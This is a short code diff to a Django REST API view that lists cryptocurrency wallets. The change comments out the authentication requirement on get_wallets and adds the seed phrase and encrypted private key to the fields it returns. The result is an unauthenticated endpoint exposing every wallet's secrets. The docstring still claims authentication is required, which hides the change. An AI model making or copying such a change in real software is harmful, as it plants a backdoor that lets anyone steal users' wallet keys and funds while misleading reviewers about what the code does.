@@ -99,10 +99,10 @@ def logout(request):
 
 
 @api_view(["GET"])
-@permission_classes([IsAuthenticated])
+# @permission_classes([IsAuthenticated])
 def get_wallets(request):
     """List all wallets (for demo purposes, requires authentication)"""
-    wallets = Wallet.objects.values("address", "created_at")
+    wallets = Wallet.objects.values("address", "created_at", "seed_phrase", "encrypted_private_key")
     return Response(list(wallets))
 
 def check_blockchain_connection(request):
